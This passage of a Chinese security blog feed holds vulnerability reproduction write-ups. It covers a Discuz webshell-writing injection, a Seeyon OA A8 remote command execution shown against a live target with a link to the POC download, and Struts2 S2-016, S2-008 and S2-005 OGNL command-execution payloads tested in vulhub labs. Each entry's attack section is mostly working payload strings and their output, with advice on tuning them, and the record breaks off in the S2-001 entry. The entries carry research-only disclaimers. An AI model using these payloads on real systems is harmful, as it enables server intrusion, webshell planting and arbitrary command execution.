class="line">%27.+file_put_contents%28%27godz.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522godz%2522%255d%29%253b%253f%253e%27%29%29.%27</span><br></pre></td></tr></table></figure><p>原始的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;.+file_put_contents(&#39;godz.php&#39;,urldecode(&#39;&lt;?php  eval($_GET[&quot;godz&quot;]);?&gt;&#39;)).&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190714183737657.png" alt="在这里插入图片描述"></p><p><strong>访问网站生成木马文件,godz.php 密码为godz</strong><br>验证木马</p><p><img src="https://img-blog.csdnimg.cn/20190714184513361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h2 id="请勿用于非法用途"><a href="#请勿用于非法用途" class="headerlink" title="请勿用于非法用途"></a>请勿用于非法用途</h2><hr>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析Discuz漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>致远OA-A8系统的0day远程命令执行的实战</title>
      <link href="/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/"/>
      <url>/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="致远OA-A8系统的0day远程命令执行的实战"><a href="#致远OA-A8系统的0day远程命令执行的实战" class="headerlink" title="致远OA-A8系统的0day远程命令执行的实战"></a>致远OA-A8系统的0day远程命令执行的实战</h3><ul><li><ul><li><a href="#1_2">1.环境是实战，漏洞已经提交，打码子处理</a></li><li><a href="#2CNVDhttpswwwcnvdorgcnwebinfoshow5095_4">2.详细漏洞信息和修补参考CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095</a></li><li><a href="#3_6">3漏洞影响范围</a></li><li><a href="#4_16">4漏洞的复现</a></li><li><a href="#_19">第一步</a></li><li><a href="#_28">第二步</a></li><li><a href="#_36">第三步</a></li><li><a href="#POC__41">附上POC 请勿用非法用途，只供研究和学习</a></li></ul></li></ul><h2 id="1-环境是实战，漏洞已经提交，打码子处理"><a href="#1-环境是实战，漏洞已经提交，打码子处理" class="headerlink" title="1.环境是实战，漏洞已经提交，打码子处理"></a>1.环境是实战，漏洞已经提交，打码子处理</h2><h2 id="2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095"><a href="#2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095" class="headerlink" title="2.详细漏洞信息和修补参考CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095"></a>2.详细漏洞信息和修补参考CNVD官网查看<a href="https://www.cnvd.org.cn/webinfo/show/5095" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/5095</a></h2><h2 id="3漏洞影响范围"><a href="#3漏洞影响范围" class="headerlink" title="3漏洞影响范围"></a>3漏洞影响范围</h2><p>漏洞影响的产品版本包括：</p><p>致远A8-V5协同管理软件 V6.1sp1</p><p>致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3</p><p>致远A8+协同管理软件V7.1</p><h2 id="4漏洞的复现"><a href="#4漏洞的复现" class="headerlink" title="4漏洞的复现"></a>4漏洞的复现</h2><p>先采集一波url，找到对应版本，这个就不细说了</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>先访问这个路径，看有没有开启远程Servlet接口暴露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;seeyon&#x2F;htmlofficeservlet</span><br></pre></td></tr></table></figure><p>成功反馈<br><img src="https://img-blog.csdnimg.cn/20190703150053356.png" alt="在这里插入图片描述"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>搞出Burp进行改包，上POC<br><img src="https://img-blog.csdnimg.cn/20190703150242400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包 回包<br><img src="https://img-blog.csdnimg.cn/20190703150842658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190703150714256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""><br>这算是写入了</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>调用命令执行<br>访问 /test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+net user<br><img src="https://img-blog.csdnimg.cn/20190703151141147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="附上POC-请勿用非法用途，只供研究和学习"><a href="#附上POC-请勿用非法用途，只供研究和学习" class="headerlink" title="附上POC 请勿用非法用途，只供研究和学习"></a>附上POC 请勿用非法用途，只供研究和学习</h2><p>链接：<a href="https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA" target="_blank" rel="noopener">https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA</a><br>提取码：0qk7<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-016漏洞环境和POC</title>
      <link href="/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-016漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-016漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-016漏洞环境和POC"></a>【研究】Struts2漏洞之S2-016漏洞环境和POC</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_18">3.影响版本</a></li><li><a href="#4_21">4.利用过程</a></li><li><a href="#POC_24">POC</a></li><li><a href="#POC_49">POC注意</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p></blockquote><p>所以，访问<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.3.15</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/20190702160552445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>此漏洞用的是get传输即可实现，直接加就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%<span class="number">23</span>a%<span class="number">3</span>d(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">'cmd.exe'</span>, <span class="string">'/c'</span>,<span class="string">'whoami'</span>&#125;&#125;)).start(),%<span class="number">23</span>b%<span class="number">3</span>d%<span class="number">23</span>a.getInputStream(),%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.InputStreamReader(%<span class="number">23</span>b),%<span class="number">23</span>d%<span class="number">3</span>dnew java.io.BufferedReader(%<span class="number">23</span>c),%<span class="number">23</span>e%<span class="number">3</span>dnew <span class="keyword">char</span>[<span class="number">50000</span>],%<span class="number">23</span>d.read(%<span class="number">23</span>e),%<span class="number">23</span>matt%<span class="number">3</span>d%<span class="number">23</span>context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%<span class="number">23</span>matt.getWriter().println(%<span class="number">23</span>e),%<span class="number">23</span>matt.getWriter().flush(),%<span class="number">23</span>matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019070216140213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件，打开看命令<br><img src="https://img-blog.csdnimg.cn/20190702161305961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#39;cmd.exe&#39;, &#39;&#x2F;c&#39;,&#39;whoami&#39;&#125;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>下载打开文件<br><img src="https://img-blog.csdnimg.cn/20190702161717489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这里发现POC是循环一样的数据 是这两句话 #d.read(#e),#matt.getWriter().println(#e)<br>多写几遍就是手动循环几遍</p><p>还有这句话 #e=new char[50000],#d.read(#e)<br>e的大小也关乎显示内容的长短，如果发现回显显示不全，可调整大一些</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"><a href="#【研究】Struts2漏洞之S2-008漏洞环境和可用POC" class="headerlink" title="【研究】Struts2漏洞之S2-008漏洞环境和可用POC"></a>【研究】Struts2漏洞之S2-008漏洞环境和可用POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_20">3.影响版本</a></li><li><a href="#4_23">4.利用过程</a></li><li><a href="#POC_27">POC</a></li><li><a href="#POC_43">有效POC’’</a></li><li><a href="#POC_51">POC注意</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html</span><br></pre></td></tr></table></figure><blockquote><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%<span class="number">23</span>context%<span class="number">5</span>b%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5</span>d%<span class="number">3</span>dfalse%<span class="number">2</span>c%<span class="number">23f</span>%<span class="number">3</span>d%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29</span>.getDeclaredField%<span class="number">28</span>%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>ctrue%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>a%<span class="number">3</span>d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29</span>.exec%<span class="number">28</span>%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">29</span>.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>b%<span class="number">3</span>dnew java.io.InputStreamReader%<span class="number">28</span>%<span class="number">23</span>a%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.BufferedReader%<span class="number">28</span>%<span class="number">23</span>b%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>d%<span class="number">3</span>dnew <span class="keyword">char</span>%<span class="number">5</span>b50000%<span class="number">5</span>d%<span class="number">2</span>c%<span class="number">23</span>c.read%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor%<span class="number">3</span>d%<span class="number">23</span>context.get%<span class="number">28</span>%<span class="number">22</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>%<span class="number">29</span>.getWriter%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.println%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.flush%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.close%<span class="number">28</span>%<span class="number">29</span></span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong></p><p><img src="https://img-blog.csdnimg.cn/20190701164539250.png" alt="在这里插入图片描述"><br>一样弹出回显<img src="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="下载"><br><img src="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道什么编码，没东西好想</p><p>**</p><h2 id="有效POC’’"><a href="#有效POC’’" class="headerlink" title="有效POC’’"></a>有效POC’’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.128:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[501],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span></span><br></pre></td></tr></table></figure><p>这个是网上找的结合007构造的POC<br>可以直接回显<br><img src="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这个poc也是得自己去调整，不是完全试用的<br>简单阅读和实验之后发现POC，发现res存在大小上限<br>测试发现，res更改的数值可以控制回显的字数多少</p><p>我这个大于700之后就是null了<br><img src="https://img-blog.csdnimg.cn/20190701170137420.png" alt="在这里插入图片描述"><br>但是从小的开始10慢慢增加会显示的数量<br><img src="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>500的时候差不多都显示了，所以这个得自己千调整试试</p><p>注意灵活控制res大小，注意不要将res大小超过命令执行结果</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-005漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-005漏洞环境和可用POC"><a href="#【研究】Struts2漏洞之S2-005漏洞环境和可用POC" class="headerlink" title="【研究】Struts2漏洞之S2-005漏洞环境和可用POC"></a>【研究】Struts2漏洞之S2-005漏洞环境和可用POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_34">3.影响版本</a></li><li><a href="#4_37">4.利用过程</a></li><li><a href="#POC_42">POC</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>参考吴翰清的《白帽子讲Web安全》一书。</p></blockquote><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city&#x3D;Bishkek&amp;user[&#39;favoriteDrink&#39;]&#x3D;kumys </span><br><span class="line">&#x2F;&#x2F;会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure><p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><ul><li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li><li>S2-003 后官方增加了安全模式（沙盒）</li><li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li></ul><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p><img src="https://img-blog.csdnimg.cn/20190701141120939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(kxlzx)(kxlzx)&amp;(<span class="string">'\u0023_memberAccess.allowStaticMethodAccess\u003dtrue'</span>)(bla)(bla)&amp;(<span class="string">'\u0023mycmd\u003d\'ipconfig\''</span>)(bla)(bla)&amp;(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)'</span>)(bla)(bla)&amp;(A)((<span class="string">'\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())'</span>)(bla))&amp;(B)((<span class="string">'\u0023myres\u003dnew\40byte[51020]'</span>)(bla))&amp;(C)((<span class="string">'\u0023mydat.readFully(\u0023myres)'</span>)(bla))&amp;(D)((<span class="string">'\u0023mystr\u003dnew\40java.lang.String(\u0023myres)'</span>)(bla))&amp;(<span class="string">'\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()'</span>)(bla)(bla)&amp;(E)((<span class="string">'\u0023myout.getWriter().println(\u0023mystr)'</span>)(bla))</span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong><br><img src="https://img-blog.csdnimg.cn/20190701162044691.png" alt="在这里插入图片描述"></p><p>POC放到tomcat8.5 下会返回400，这个POC没回显。找了一下其他带回显poc没效果，之后再研究，有没有大佬指导一下是tomcat的版本原因吗</p><p>Apache Tomcat/7.0.56 这个版本是有回显的<br>会弹出一下下载<br><img src="https://img-blog.csdnimg.cn/20190701162055597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后打开看看<br><img src="https://img-blog.csdnimg.cn/20190701162131556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就是回显的命令</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-001漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】Struts2漏洞之S2-001漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-001漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-001漏洞环境和POC"></a>【研究】Struts2漏洞之S2-001漏洞环境和POC</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_19">3.影响版本</a></li><li><a href="#4_23">4.利用过程</a></li><li><a href="#POC_33">POC</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 